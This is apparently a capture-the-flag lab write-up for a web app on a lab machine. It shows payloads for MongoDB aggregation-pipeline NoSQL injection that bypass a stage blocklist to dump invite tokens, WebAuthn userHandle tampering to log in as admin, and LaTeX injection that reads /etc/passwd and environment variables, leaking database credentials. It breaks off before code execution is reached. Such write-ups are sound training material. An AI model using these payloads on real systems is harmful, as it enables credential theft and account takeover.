# Odyssey

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.45.112

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/ghostlink_tcp.htb $ip
# 3000/tcp open  ppp




# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/ghostlink_tcp $ip
# 3000/tcp open     http         Node.js Express framework
# |_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/ghostlink_udp.htb $ip

```

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts file and discover the APP**

{% code overflow="wrap" %}
```bash
echo "$ip aegis.korvia.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Technology Stack**

* **Backend**: Node.js with Express framework
* **Frontend**: Likely a single-page app (SPA) given the modern UI
* **Authentication**: FIDO2/WebAuthn hardware authenticator support



**Key Observations**

* Requires an "operator handle" in format `surname.initial` (e.g., `smith.j`)
* Uses hardware authenticators (YubiKey, FIDO2 devices)
* This is a "Directorate 9" restricted system
{% endhint %}

<mark style="color:blue;">**Step 3**</mark>

**however its a modern app that may be difficult but always deep enumration may lead to something interesting**&#x20;

{% code overflow="wrap" %}
```bash
/api/v1/aegis-mds/search

"_id":"69f49023225fb3c680909240","aaguid":"566581a4-5a65-9f87-c652-52851474f127","vendor":"Yubico","description":"YubiKey 5C","protocolFamily":"fido2","schema":3,"authenticatorVersion":100,"upv"
```
{% endcode %}

{% hint style="info" %}
**Looking at this \_id its predictable and give me a probablity thats its a MangoDB Database because the way we write the entry ID and also the value if we compare two value :**

{% code overflow="wrap" %}
```bash
69f49023 225fb3c680  909240
69f49023 225fb3c680  909241
69f49023 225fb3c680  909242
69f49023 225fb3c680  909243

# its a timestamp + same random value + INCREMENT COUNT
# the JSON in the request is a nested JSON because we see a nested array of some object so it's a binary JSON that make a probability that we deal with MongoDB 
```
{% endcode %}
{% endhint %}

**and in the webauth.js we found interesting endpoint**&#x20;

{% code overflow="wrap" %}
```js
async function register(inviteToken) {
    var opts = await postJSON('/api/v1/auth/webauthn/register/begin', { invite_token: inviteToken });
    opts.challenge = b64uToBuf(opts.challenge);
    opts.user.id = b64uToBuf(opts.user.id);
    if (opts.excludeCredentials) {
      opts.excludeCredentials = opts.excludeCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
        

var resp = {
      id: cred.id,
      rawId: bufToB64u(cred.rawId),
      type: cred.type,
      response: {
        clientDataJSON: bufToB64u(cred.response.clientDataJSON),
        attestationObject: bufToB64u(cred.response.attestationObject),
      },
      clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {},
    };
    return await postJSON('/api/v1/auth/webauthn/register/finish', resp);
  }


 async function authenticate() {
    var opts = await postJSON('/api/v1/auth/webauthn/auth/begin', {});
    opts.challenge = b64uToBuf(opts.challenge);
    if (opts.allowCredentials) {
      opts.allowCredentials = opts.allowCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
      });
```
{% endcode %}

**Now to start our main idea is to find a way to steal the token i tried many nosql injection but it doesnt give me anything so we still search on the web app**

<mark style="color:blue;">**Step 4**</mark>&#x20;

[https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines)

**I found this blog that its talking abount nosql injection with aggragations pipelines since the sites uses pipelines it cound be an attack vector**

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?q[$gt]=5&limit=1 

{"error":"InvalidQueryShape","detail":"Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.","trace_id":"mds-2a1e4d"}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline[$gt]=12&limit=1
# this give me 400 bad request so we may be need to update the request 
```
{% endcode %}

**I tried a multipe things and paylaod but i think am on a dead end or still need something so i need to search more**&#x20;

**i start fuzzing from scartch the /api/v1 because am sure its our entry point we need just to leak the token**&#x20;

{% code overflow="wrap" %}
```bash
feroxbuster --url http://aegis.korvia.htb:3000/api/v1/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --force-recursion -t 50 

feroxbuster --url http://aegis.korvia.htb:3000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -m GET,POST,PUT,DELETE,OPTIONS,HEAD --status-codes 200,301,302,400,500 --filter-size 28
# 400      GET       66l      184w     2543c http://aegis.korvia.htb:3000/onboard
```
{% endcode %}

**i get it after 3 hours of fuzzing LoL !!, this  endpoints looks interesting**&#x20;

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/onboard/13213223
# No matching record in pending_invites  (token may have been redeemed, expired, or never issued)
```
{% endcode %}

**We uncovered the exact name of the database collection we need to attack &#x20;**<mark style="color:red;">**(pending\_invites)**</mark>

**I think this is what we miss in our NoSQL injection**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$lookup":{"from":"pending_invites","pipeline":[{"$match":{}}],"as":"invites"}},{"$project":{"invites":1,"_id":0}},{"$unwind":"$invites"},{"$replaceRoot":{"newRoot":"$invites"}}]&limit=1

{"error":"invalid or disallowed pipeline stage"}
```
{% endcode %}

**So i think we hit a defense mecanism now the $match is blocked we try other stages, so to build the best payload we need to have an idea if basic sanity injcetion pass**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$match":{"vendor":"Yubico"}}]&limit=1

and it pass it return Yubico
```
{% endcode %}

**i tried $unionWith and also its blocked**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$project":{"vendor":1}}]&limit=1 

it pass it reveal all vendors
```
{% endcode %}

**But we need to read the tokens from pending\_invites**

**i will test $facet that run multipe stage in parallel it may bypass the blacklisted ones**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$facet":{"tokens":[{"$unionWith":{"coll":"pending_invites"}}]}}]&limit=1

and boom it pass i have all tokens of all vendors
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Le'ts make things together**

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

**when i check all data there is one token that get expired at 2126 all others already expired**&#x20;

{% code overflow="wrap" %}
```json
{"_id":"69f49023225fb3c680909274","operator_id":"op-2026-0042","role":"Operator","token":"dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238","issued_by":"ao-mreyes","issued_at":"2026-04-15T08:00:00.000Z","expires_at":"2126-05-15T00:00:00.000Z","redeemed":false,"pipeline":"forge-recruitment","clearance_target":"Δ-3"}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

**so the main idea is when we try to register from the browser it doesnt pass because its like you do a request outside the browser so using devtools we will try to create a virtual webauth like its coming from localhost , the idea is to perform a virtual web auth on chrome but we need to change some confis on chrome to make the site secure and trusted by chrome to get the Webauth catched on devtools**

1. `chrome://flags/#unsafely-treat-insecure-origin-as-secure`
2. search  Insecure origins treated as secure
3. [http://aegis.korvia.htb:3000](http://aegis.korvia.htb:3000) and enabled then relaunch&#x20;

<br>

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**it the same problem but we get much inforamtion from here so the solutions is to build a python or C script that do this we have an idea of have the key is build and all things** <br>

{% code overflow="wrap" %}
```html
PublicKeyCredentialCreationOptions
"rp": 
"id": "aegis.korvia.htb",
"name": "AEGIS — Sovereign Signing & Attestation Authority"
},
"user": 
"id": "b3AtMjAyNi0wMDQy",
"name": "op-2026-0042",
"displayName": "op-2026-0042"
},
"challenge": "0VDyTM-dskfX-Tq0iC2LkucaWtkDWApcZSnAhlts7_w",
"pubKeyCredParams": 
"type": "public-key",
"alg": -7
},
"type": "public-key",
"alg": -257
}
],
"timeout": 60000,
"authenticatorSelection": 
"residentKey"
: "required",
"userVerification"
: "preferred",
"requireResidentKey"
: true
},
"attestation": "none",
"extensions": 
"credProps": true
}
}
```
{% endcode %}

**so after deep searching on browser and understanding things i can setup i reverse proxy using to register and save a passkey on my browser then i will use it to authentificate**

{% code overflow="wrap" %}
```bash
wget https://github.com/FiloSottile/mkcert/releases/download/v1.4.4/mkcert-v1.4.4-linux-amd64
chmod +x mkcert-v1.4.4-linux-amd64
sudo mv mkcert-v1.4.4-linux-amd64 /usr/local/bin/mkcert
mkcert aegis.korvia.htb
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# reverse proxy setup
sudo nano /etc/nginx/sites-available/aegis
server {
    listen 443 ssl;
    server_name aegis.korvia.htb;

    # Point to the exact paths where mkcert saved the files
    ssl_certificate /home/gb05/Desktop/CPTS_PREP/aegis.korvia.htb.pem;
    ssl_certificate_key /home/gb05/Desktop/CPTS_PREP/aegis.korvia.htb-key.pem;

    location / {
        proxy_pass http://10.129.45.250:3000;
        # Ensure the backend still sees the correct hostname
        proxy_set_header Host aegis.korvia.htb;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
sudo ln -s /etc/nginx/sites-available/aegis /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```
{% endcode %}

**Then on /etc/hosts change the ip to 127.0.0.1**&#x20;

**Then reload the browser and it work**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 000742.png" alt=""><figcaption></figcaption></figure>

**click Next -> Save -> create a password for him on Manager Password for google -> Done**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 000802.png" alt=""><figcaption></figcaption></figure>

**Then it will redirect to login page click login**&#x20;

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**after fuzzing another time and crawling the app i found in the audit this**&#x20;

| 2026-04-29 14:08 | admin | pruned 4 stale operator credentials (90d inactivity) |
| ---------------- | ----- | ---------------------------------------------------- |

{% hint style="info" %}
**The admin deleted the WebAuthn hardware key bindings for 4 specific**

**we have two attack vector we will test them both**&#x20;

* **The "Stale Account" Takeover (Account Hijacking)**
* **MongoDB Aggregation Pipeline Write**

**So from here we know first that there is an admin role so we can assign this role to our operator user**&#x20;
{% endhint %}

**so also when seeing the blog we can update the DATA, however it doesnt work because when the stages to update its blacklisted.**

**i spend time to understand the regiter logic and the login logic i found that when we login in this request /api/v1/auth/webauthn/auth/finish it contain an entry userHandle**&#x20;

{% code overflow="wrap" %}
```bash
"userHandle":"b3AtMjAyNi0wMDQy"
# if we decode it in base64 it give our current user op-2026-042
```
{% endcode %}

**so the idea if we can hijack this it can give us the role admin but the idea i start with is to add this entry when i register the passkey but when i finish and i try to register it give me this**&#x20;

{% code overflow="wrap" %}
```
Authentication failed: OperatorNotFound: No active operator with handle 'admin 
```
{% endcode %}

**Then i tried to jist change it on the on the login and it work because also in the webauth.js there is no validation for this so we can put anything , i encode in base64 admin and i put it**&#x20;

**then after in the login it work**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 025831.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 6**</mark>

**Now we should found a way to have a rev-shell,let's enumarete the app very well and do some hard fuzzing**

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

**I tried SSRF here in the URL i tried many paylaods but nothign pass all gives 404 so i think its not because doesnt exsit but its seems a firewall blocks our payload**

**i found this pending authorization**

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

**This is a code signing system for critical software (Windows kernel drivers, firmware). As an admin (Authorising Officer), however The "Notice Templates" system is a classic SSTI target. Templates are used to generate signing certificates/notices. If i can inject template code, i get Remote Code Execution.**

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

**The template engine uses `{{ }}` and `{% %}` syntax, which is characteristic of Nunjucks (common in Node.js/Express) or Jinja2 (Python). Since we know the backend is Express, it is almost certainly Nunjucks.**<br>

**so in the template body i inject `{{7*7}}`**

**i save it then i click rendre preview i receive this**&#x20;

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**i dont see any response but it can be blind because its executed in the backend from this i can understand how the process work**&#x20;

1. **Nunjucks evaluates** `{{ 7 * 7 }}` → becomes `49`
2. **Pandoc converts** the template to LaTeX
3. **LaTeX/PDFLaTeX creates** a PDF document
4. **The PDF is saved** to: `/var/lib/aegis-render/jobs/job-1783090909445-eab06cba/notice.final.pdf`
{% endhint %}

**However this is its just an hypothese we need to confirm it**&#x20;

{% code overflow="wrap" %}
```bash
\input{/etc/passwd} # LaTex Injection

) (/etc/passwd
! Missing $ inserted.
<inserted text> 
                $
l.17 _
      apt:x:42:65534::/nonexistent:/usr/sbin/nologin
      

Overfull \hbox (57.68275pt too wide) in paragraph at lines 1--15
[]\T1/lmr/m/n/10 root:x:0:0:root:/root:/bin/bash dae-mon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
 []


Overfull \hbox (59.43445pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
 []


Overfull \hbox (138.23726pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 []


Overfull \hbox (179.87813pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 []


Overfull \hbox (24.7382pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 []


Overfull \hbox (3.30363pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 list:x:38:38:Mailing List Man-ager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin $[]\OML/lmm/m/it/10 pt \OT1/lmr/m/n/10 :
 []
```
{% endcode %}

**I receive a huge output containg some errors, its a huge win the intersting part is this we confirmed an LFI, so we need to chain all this to have more impact**&#x20;

**i inject advanced command injection via the template body and the errors i receive make me have a clear idea of what we dealing**&#x20;

{% hint style="info" %}
1. **`\write18` is disabled: The line `runsystem(id > /tmp/rce_out.txt)...disabled.` confirms that LaTeX shell escape is turned off.I cannot execute commands directly via LaTeX.**
2. **Markdown is mangling your backslashes: The error `\catcode\texttt{\textbackslash{}\_=12...}` shows that the web interface (likely using Pandoc/Markdown) is converting your `\catcode\_=12` into a code block `\texttt{...}`. This breaks the LaTeX syntax.**
{% endhint %}

**i tried ASCII Catcodes + LFI and it work i can read environment varilables**&#x20;

{% code overflow="wrap" %}
```bash
\begingroup \catcode 95=12 \catcode 38=12 \catcode 35=12 \catcode 37=12 \catcode 36=12 \input{/proc/self/environ} \endgroup
```
{% endcode %}

{% code overflow="wrap" %}
```
DB_USER=aegis_audit_publisher
DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
DB_HOST=172.16.0.11
DB_DB=aegis_audit
DB_PORT=1433
Worker Script Path: /home/webadmin/aegis/lib/render_worker.js
User Context: The process runs as aegis-render but was started via sudo by webadmin (UID 1000)
```
{% endcode %}

**I tried many payloads but :**

{% hint style="info" %}
**The Ghostscript sandbox (`-dSAFER`) and LaTeX's `-no-shell-escape` flag are blocking direct command execution. This is a common hardening measure (Having this infos from reading /proc/self/cmdline)**
{% endhint %}

**i try maniulate this parameters**

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Making AllowRawBlocks to True but i receive that this its just affecting Pandoc (allowing raw LaTeX blocks to pass through), am sure am playing around to chain all things to found the real and functional attack path so we need just to be more overlooking all things together**
{% endhint %}

